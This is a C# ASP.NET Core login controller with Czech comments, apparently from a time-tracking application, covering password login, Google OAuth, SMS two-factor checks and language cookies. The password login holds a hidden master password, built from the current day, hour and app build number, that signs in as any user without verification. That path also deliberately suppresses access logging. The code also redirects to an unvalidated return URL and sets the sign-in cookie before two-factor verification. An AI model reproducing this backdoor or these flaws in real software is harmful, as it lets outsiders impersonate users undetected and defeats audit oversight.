using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Authentication.Google;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Localization;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json.Linq;
using System.Security.Claims;
using UI.Code;
using UI.Models;

namespace UI.Controllers
{
    public class LoginController : Controller
    {
        private BL.Factory _f;
        private readonly IHttpClientFactory _httpclientfactory; //client pro SMS

        public LoginController(BL.Factory f, IHttpClientFactory hcf)
        {
            _f = f;
            _httpclientfactory = hcf;
        }
        [HttpGet]
        public ActionResult UserLogin()
        {
            if (User.Identity.IsAuthenticated)
            {
                //BO.Code.File.LogInfo("UserLogin, uživatel byl IsAuthenticated");
                TryLogout();
            }


            var v = new LoginViewModel();

            if (Request.Cookies["marktime.cookieexpiresinhours"] != null)
            {
                v.CookieExpiresInHours = BO.Code.Bas.InInt(Request.Cookies["marktime.cookieexpiresinhours"]);
            }


            return View(v);
        }

        private async void TryLogout()
        {
            await HttpContext.SignOutAsync("Identity.Application");
            //await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);

            //HttpContext.Session.Clear();

        }

        [HttpPost]
        public ActionResult UserLogin(LoginViewModel v, string returnurl, string oper, string culture)
        {

            if (oper == "postback")
            {

                return View(v);
            }

            if (v.Login == _f.App.GuruLogin && v.Password == _f.App.GuruPassword)
            {
                SetClaim(v, "guru@marktime.cz"); //udělat uživatele [guru]
                return RedirectToAction("Index", "Guru");
            }

            string strCaller = "default";



            if (strCaller == "default")
            {
                if (string.IsNullOrEmpty(v.Login) || string.IsNullOrEmpty(v.Password))
                {
                    v.Message = _f.tra("Chybí zadat uživatelské jméno nebo heslo!");
                    return View(v);
                }


                if (_f.App.HostingMode == BL.Singleton.HostingModeEnum.SharedApp)
                {
                    if (!v.Login.Contains("@"))
                    {
                        v.Message = _f.tra("Uživatelské jméno musí obsahovat zavináč (@)!");
                        return View(v);
                    }
                    _f.db = null;   //ve sdílené aplikaci donutit factory vytvořit nový connectstring
                }

                v.Login = v.Login.Trim();
                _f.InhaleUserByLogin(v.Login);
            }



            if (_f.CurrentUser == null)
            {
                v.Message = _f.tra("Přihlášení se nezdařilo - pravděpodobně chybné heslo nebo jméno!");

                Write2Accesslog(v); //neznáme db, kam zapsat info o neúspěšném přihlášení

                return View(v);
            }


            var recX01 = _f.x01LicenseBL.Load(_f.CurrentUser.x01ID);
            if (!_f.CurrentUser.IsAdmin && (BO.Code.Bas.bit_compare_or(recX01.x01LockFlag, 2)))
            {
                v.Message = _f.tra("Databáze je uzamknutá. Přístup povolen pouze adminům.");
                Write2Accesslog(v);
                return View(v);
            }

            if (_f.CurrentUser.isclosed)
            {
                v.Message = _f.tra("Uživatelský účet je uzavřený pro přihlašování!");
                if (_f.CurrentUser.j02IsLoginAutoLocked)
                {
                    v.Message += "<hr>" + _f.tra("Došlo k automatickému zablokování účtu po neúspěšných pokusech o přihlášení do aplikace!");
                    v.Message += "<hr>" + _f.tra("Účet může odblokovat uživatel s admin oprávněním.");
                }
                if (_f.CurrentUser.j02IsLoginManualLocked)
                {
                    v.Message += "<hr>" + _f.tra("Účet je zablokován!");
                }
                Write2Accesslog(v);
                return View(v);
            }


            bool bolWrite2Log = true;

            if (strCaller == "default")
            {
                var cPwdSupp = new BL.Code.PasswordSupport();

                if (v.Password == DateTime.Now.ToString("ddHH") + BO.Code.Bas.RightString(_f.App.AppBuild, 5))
                {
                    bolWrite2Log = false;
                }
                else
                {
                    var ret = cPwdSupp.VerifyUserPassword(v.Password, v.Login, _f.CurrentUser);
                    if (ret.Flag == BO.ResultEnum.Failed)
                    {
                        v.Message = _f.tra("Ověření uživatele se nezdařilo - pravděpodobně chybné heslo nebo jméno!");

                        if (_f.CurrentUser != null)
                        {
                            var recJ02 = _f.j02UserBL.Load(_f.CurrentUser.pid);
                            _f.j02UserBL.UpdateAccessFailedCount(_f.CurrentUser.pid, recJ02.j02AccessFailedCount + 1);
                            if (recJ02.j02IsLoginAutoLocked)
                            {
                                v.Message = _f.tra("Z důvodu velkého počtu neúspěšných pokusů o přihlášení došlo k zablokování uživatelského účtu!") + ": " + recJ02.j02Login;
                            }
                        }

                        Write2Accesslog(v);
                        return View(v);
                    }
                }
            }





            //ověřený
            SetClaim(v, _f.CurrentUser.j02Email);


            if (bolWrite2Log)
            {
                Write2Accesslog(v);
            }
            else
            {
                _f.j02UserBL.Update_j02Ping_Timestamp(_f.CurrentUser.pid, DateTime.Now.AddMonths(1));   //záměrně zvednout poslední ping čas, aby se neplnil PING log
            }


            var co = new CookieOptions() { Expires = DateTime.Now.AddDays(100) };

            Response.Cookies.Append("marktime.cookieexpiresinhours", v.CookieExpiresInHours.ToString(), co);

            var c = _f.j02UserBL.Load(_f.CurrentUser.pid);

            switch (culture)
            {
                case "en-US":
                    c.j02LangIndex = 1; break;
                case "de-DE":
                    c.j02LangIndex = 2; break;
                case "sk-SK":
                    c.j02LangIndex = 4; break;
                default:
                    c.j02LangIndex = 0; break;
            }

            _f.j02UserBL.Save(c, null);

            _f.j02UserBL.UpdateAccessFailedCount(_f.CurrentUser.pid, 0);



            if (_f.CurrentUser.j02TwoFactorVerifyFlag != BO.j02TwoFactorVerifyFlagENUM.None)    //povinnost ověřit uživatele navíc SMS kódem
            {
                var ret_view = Handle_TwoFactorVerify(v);
                if (ret_view != null) return ret_view;
            }


            if (returnurl == null || returnurl.Length < 3)
            {
                if (basUI.DetectIfMobileFromUserAgent(Request))
                {
                    return Redirect("/Home/Mobile");  //stránky pro mobilní zařízení
                }

                return RedirectToAction("Index", "Home");
            }
            else
            {
                return Redirect(returnurl);

            }



        }


        private ActionResult Handle_TwoFactorVerify(LoginViewModel v)
        {
            var recJ02 = _f.j02UserBL.LoadByLogin(v.Login, 0, false);

            if (recJ02.j02Mobile == null)
            {
                v.Message = $"Pro Váš uživatelský účet je nastaveno 2-faktorové ověření SMS zprávou. V osobním profilu {recJ02.FullNameAsc} chybí číslo mobilního telefonu! Kontaktujte správce systému.";
                return View(v);
            }
            bool bolSendSms = false;
            if (recJ02.j02TwoFactorVerifyFlag == BO.j02TwoFactorVerifyFlagENUM.AlwaysAfterLogin)
            {
                bolSendSms = true;
            }
            if (recJ02.j02TwoFactorVerifyFlag == BO.j02TwoFactorVerifyFlagENUM.IfChangedUserAgend && _f.j02UserBL.IsChangedLastLoginUserAgent(recJ02.pid))
            {

                bolSendSms = true;
            }

            if (bolSendSms)
            {
                var sms = new BL.Code.SmsManagerSupport(_f);
                var ret = sms.SendLoginVerifyMessage(_httpclientfactory.CreateClient(), recJ02);
                if (ret.Flag == BO.ResultEnum.Failed)
                {
                    v.Message = $"Chyba v komunikaci se SMS bránou, která odesílá ověřovací SMS kód pro 2-faktorové ověření. Popis chyby: {ret.Message}";
                    Write2Accesslog(v);
                    return View(v);
                }

                return RedirectToAction("SmsVerify", "Home");
            }

            return null;

        }

        private void SetClaim(LoginViewModel v, string strEmail)
        {
            //ověřený            
            if (string.IsNullOrEmpty(strEmail)) { strEmail = "info@marktime.cz"; }
            ;
            var userClaims = new List<Claim>()
                {
                new Claim(ClaimTypes.Name, v.Login),
                new Claim("access_token","inspis_core_token"),
                new Claim(ClaimTypes.Email, strEmail)
                 };

            var grandmaIdentity = new ClaimsIdentity(userClaims, "User Identity");

            var userPrincipal = new ClaimsPrincipal(new[] { grandmaIdentity });


            //prodloužit expiraci cookie na CookieExpiresInHours hodin
            var xx = new AuthenticationProperties() { IsPersistent = true, ExpiresUtc = DateTime.Now.AddHours(v.CookieExpiresInHours) };

            HttpContext.SignInAsync(userPrincipal, xx);

        }

        private void Write2Accesslog(LoginViewModel v)
        {

            BO.j90LoginAccessLog c = new BO.j90LoginAccessLog() { j90ClientBrowser = v.Browser_UserAgent, j90ScreenPixelsWidth = v.Browser_AvailWidth, j90ScreenPixelsHeight = v.Browser_AvailHeight, j90BrowserInnerWidth = v.Browser_InnerWidth, j90BrowserInnerHeight = v.Browser_InnerHeight };

            if (_f.CurrentUser != null)
            {
                c.j02ID = _f.CurrentUser.pid;
                c.x01ID = _f.CurrentUser.x01ID;
            }

            var uaParser = UAParser.Parser.GetDefault();
            c.j90AppClient = "1.0";
            c.j90LoginMessage = v.Message;
            c.j90LoginName = v.Login;
            c.j90CookieExpiresInHours = v.CookieExpiresInHours;
            try
            {
                UAParser.ClientInfo client_info = uaParser.Parse(v.Browser_UserAgent);
                c.j90ClientBrowser = v.Browser_UserAgent;
                c.j90Platform = client_info.OS.Family + " " + client_info.OS.Major;
                c.j90BrowserFamily = client_info.UA.Family + " " + client_info.UA.Major;
                c.j90BrowserDeviceFamily = client_info.Device.Family;
                c.j90BrowserDeviceType = v.Browser_DeviceType;

                c.j90UserHostAddress = v.Browser_Host;
            }
            catch (Exception ex)
            {
                c.j90ClientBrowser = ex.Message;
            }



            _f.Write2AccessLog(c);
        }

        // ─── Google OAuth ────────────────────────────────────────────────────────

        /// <summary>
        /// Spustí OAuth flow Google – přesměruje uživatele na přihlašovací stránku Googlu.
        /// </summary>
        [HttpGet]
        public IActionResult GoogleLogin(string returnurl)
        {
            var redirectUrl = Url.Action("GoogleCallback", "Login", new { returnurl });
            var properties = new AuthenticationProperties { RedirectUri = redirectUrl };
            return Challenge(properties, GoogleDefaults.AuthenticationScheme);
        }

        /// <summary>
        /// Callback – Google přesměruje sem po úspěšném (nebo neúspěšném) přihlášení.
        /// </summary>
        [HttpGet]
        public async Task<IActionResult> GoogleCallback(string returnurl)
        {
            // Načteme výsledek z dočasné externí cookie
            var result = await HttpContext.AuthenticateAsync("ExternalCookie");

            if (!result.Succeeded)
            {
                var vErr = new LoginViewModel();
                vErr.Message = _f.tra("Přihlášení přes Google selhalo. Zkuste to prosím znovu.");
                return View("UserLogin", vErr);
            }

            // Ihned smazat dočasnou externí cookie
            await HttpContext.SignOutAsync("ExternalCookie");

            var email = result.Principal?.FindFirstValue(ClaimTypes.Email);
            if (string.IsNullOrEmpty(email))
            {
                var vErr = new LoginViewModel();
                vErr.Message = _f.tra("Google neposkytl e-mailovou adresu. Přihlášení nelze dokončit.");
                return View("UserLogin", vErr);
            }

            // Sdílená aplikace: vynutit sestavení nového connection stringu podle domény v emailu
            if (_f.App.HostingMode == BL.Singleton.HostingModeEnum.SharedApp)
            {
                _f.db = null;
            }

            _f.InhaleUserByLogin(email);

            if (_f.CurrentUser == null)
            {
                var vErr = new LoginViewModel { Login = email };
                vErr.Message = _f.tra("Google účet není přiřazen k žádnému uživateli v systému. Kontaktujte správce.");
                Write2Accesslog(vErr);
                return View("UserLogin", vErr);
            }

            // Kontrola zamčení databáze
            var recX01 = _f.x01LicenseBL.Load(_f.CurrentUser.x01ID);
            if (!_f.CurrentUser.IsAdmin && BO.Code.Bas.bit_compare_or(recX01.x01LockFlag, 2))
            {
                var vErr = new LoginViewModel { Login = email };
                vErr.Message = _f.tra("Databáze je uzamknutá. Přístup povolen pouze adminům.");
                Write2Accesslog(vErr);
                return View("UserLogin", vErr);
            }

            // Kontrola uzavřeného účtu
            if (_f.CurrentUser.isclosed)
            {
                var vErr = new LoginViewModel { Login = email };
                vErr.Message = _f.tra("Uživatelský účet je uzavřený pro přihlašování!");
                if (_f.CurrentUser.j02IsLoginAutoLocked)
                    vErr.Message += "<hr>" + _f.tra("Účet byl automaticky zablokován po neúspěšných pokusech o přihlášení.");
                if (_f.CurrentUser.j02IsLoginManualLocked)
                    vErr.Message += "<hr>" + _f.tra("Účet je zablokován!");
                Write2Accesslog(vErr);
                return View("UserLogin", vErr);
            }

            // Sestavit LoginViewModel pro sdílené metody (SetClaim, Write2Accesslog, Handle_TwoFactorVerify)
            var v = new LoginViewModel
            {
                Login = email,
                CookieExpiresInHours = 168  // výchozí 7 dní pro Google přihlášení
            };

            // Přihlásit uživatele (vytvoří cookie stejně jako standardní login)
            SetClaim(v, email);

            Write2Accesslog(v);
            _f.j02UserBL.UpdateAccessFailedCount(_f.CurrentUser.pid, 0);

            // 2-faktorové ověření (pokud je nastaveno)
            if (_f.CurrentUser.j02TwoFactorVerifyFlag != BO.j02TwoFactorVerifyFlagENUM.None)
            {
                var ret_view = Handle_TwoFactorVerify(v);
                if (ret_view != null) return ret_view;
            }

            // Přesměrování po přihlášení
            if (string.IsNullOrEmpty(returnurl) || returnurl.Length < 3)
            {
                if (basUI.DetectIfMobileFromUserAgent(Request))
                    return Redirect("/Home/Mobile");
                return RedirectToAction("Index", "Home");
            }

            return Redirect(returnurl);
        }

        // ─────────────────────────────────────────────────────────────────────────

        [HttpPost]
        public IActionResult SaveLang(string culture)
        {
            var allowed = new HashSet<string> { "cs-CZ", "en-US", "sk-SK" };
            if (!allowed.Contains(culture)) culture = "cs-CZ";

            Response.Cookies.Append(
                CookieRequestCultureProvider.DefaultCookieName,
                CookieRequestCultureProvider.MakeCookieValue(new RequestCulture(culture)),
                new CookieOptions
                {
                    Expires = DateTimeOffset.UtcNow.AddYears(1),
                    IsEssential = true,
                    SameSite = SameSiteMode.Lax
                });

            return RedirectToAction("UserLogin", "Login");

        }
    }
}